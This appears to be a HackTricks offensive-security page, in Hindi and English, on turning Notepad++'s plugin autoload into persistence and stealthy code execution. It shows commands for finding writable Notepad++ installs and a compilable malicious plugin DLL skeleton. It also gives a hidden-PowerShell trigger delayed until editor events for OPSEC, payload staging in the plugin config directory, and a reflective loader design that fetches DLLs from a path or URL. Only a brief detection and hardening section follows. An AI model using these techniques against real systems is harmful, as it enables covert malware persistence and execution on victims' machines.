# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ लॉन्च पर अपने `plugins` subfolders के भीतर मिलने वाली हर plugin DLL को **autoload** करेगा। किसी भी **writable Notepad++ installation** में malicious plugin डालने से हर बार editor शुरू होने पर `notepad++.exe` के अंदर code execution मिलती है, जिसका उपयोग **persistence**, stealthy **initial execution**, या elevated रूप से editor लॉन्च होने पर **in-process loader** के रूप में किया जा सकता है।

**Notepad++ 7.6+** के बाद अपेक्षित manual-install layout **हर plugin के लिए एक subfolder** है (`plugins\<PluginName>\<PluginName>.dll`). **portable mode** में (`notepad++.exe` के साथ `doLocalConf.xml` मौजूद होने पर), पूरा application tree उसी directory के अंदर local रहता है, जो अक्सर copied/admin tool bundles को user-writable execution surface में बदल देता है।

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (आमतौर पर write करने के लिए admin चाहिए)।
- Low-privileged operators के लिए writable options:
- **portable Notepad++ build** को user-writable folder में use करें।
- `C:\Program Files\Notepad++` को user-controlled path में copy करें (जैसे `%LOCALAPPDATA%\npp\`) और वहाँ से `notepad++.exe` run करें।
- ऐसे **admin tool bundles**, extracted zip copies, या help-desk toolkits खोजें जिनमें पहले से `doLocalConf.xml` हो और जो `Program Files` के बाहर हों।
- हर plugin `plugins` के नीचे अपना अलग subfolder लेता है और startup पर automatically load होता है; menu entries **Plugins** के नीचे दिखाई देती हैं।

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ विशेष **exported functions** की अपेक्षा करता है। ये सभी initialization के दौरान call होती हैं, जिससे कई execution surfaces मिलते हैं:
- **`DllMain`** — DLL load होते ही तुरंत चलता है (पहला execution point)।
- **`setInfo(NppData)`** — load पर एक बार Notepad++ handles देने के लिए called होता है; menu items register करने की सामान्य जगह।
- **`getName()`** — menu में दिखने वाला plugin name लौटाता है।
- **`getFuncsArray(int *nbF)`** — menu commands लौटाता है; भले ही empty हो, startup के दौरान called होता है।
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events प्राप्त करता है (payloads को user action या editor event तक defer करने के लिए useful)।
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, बड़े data exchanges के लिए useful।
- **`isUnicode()`** — load के समय checked होने वाला compatibility flag।

ज़्यादातर exports को **stubs** के रूप में implement किया जा सकता है; execution `DllMain` से या ऊपर दिए गए किसी भी callback से autoload के दौरान हो सकता है।

## Minimal malicious plugin skeleton
Expected exports के साथ एक DLL compile करें और उसे writable Notepad++ folder में `plugins\\MyNewPlugin\\MyNewPlugin.dll` पर place करें:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL बनाएं (Visual Studio/MinGW)।
2. `plugins` के तहत plugin subfolder बनाएं और DLL को उसके अंदर रखें।
3. Notepad++ को restart करें; DLL automatically load हो जाती है, जिससे `DllMain` और उसके बाद के callbacks execute होते हैं।

## `beNotified` के जरिए low-noise trigger pattern
OPSEC के लिए, कई payloads को **DllMain** से fire **नहीं** करना चाहिए। एक quieter pattern यह है कि plugin को cleanly load होने दें, फिर केवल किसी realistic editor event के बाद execute करें, जैसे **startup complete**, **buffer activation**, या **पहला typed character**।
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
यह noisy `DllMain` beacon की तुलना में public offensive research से बेहतर मेल खाता है: DLL अभी भी startup पर autoload होती है, लेकिन malicious action तब तक delayed रहती है जब तक Notepad++ genuinely in use न लगे।

## Using the plugin config directory as secondary storage
Notepad++ `NPPM_GETPLUGINSCONFIGDIR` expose करता है, जो **current user's plugin configuration directory** return करता है। एक malicious plugin इसका use करके on-disk DLL को minimal रख सकता है, जबकि encrypted config, staged payloads, या tasking files को ऐसे path में store कर सकता है जो normal plugin state के साथ blend in हो।
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- एक छोटा autoloaded bootstrap DLL;
- per-user tasking बिना main plugin binary को फिर से छुए;
- **autoload trigger** को भारी second stage से अलग करना।

## Reflective loader plugin pattern
एक weaponized plugin Notepad++ को **reflective DLL loader** में बदल सकता है:
- एक minimal UI/menu entry दिखाएँ (जैसे, "LoadDLL")।
- एक **file path** या **URL** स्वीकार करें ताकि payload DLL fetch की जा सके।
- Reflectively DLL को current process में map करें और एक exported entry point invoke करें (जैसे, fetched DLL के अंदर एक loader function)।
- Benefit: नया loader spawn करने के बजाय benign-looking GUI process को reuse करें; payload को `notepad++.exe` की integrity inherit होती है (elevated contexts सहित)।
- Trade-offs: disk पर एक **unsigned plugin DLL** drop करना noisy है; एक practical variation यह है कि autoloaded plugin को सिर्फ stub की तरह use करें और real implant को कहीं और encrypted/staged रखें।

## Detection and hardening notes
- **Notepad++ plugin directories** में writes block या monitor करें (user profiles में portable copies सहित); controlled folder access या application allowlisting enable करें।
- `plugins` के अंदर **new unsigned DLLs**, portable Notepad++ trees में changes, और `notepad++.exe` से unusual **child processes/network activity** पर alert करें।
- legitimate plugins का baseline बनाएं और किसी भी new DLL की जांच करें जो normal Notepad++ plugin interface export करती हो लेकिन shells, PowerShell, या network beacons भी spawn करती हो।
- plugin installation केवल **Plugins Admin** के माध्यम से enforce करें, और untrusted paths से portable copies के execution को restrict करें।

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
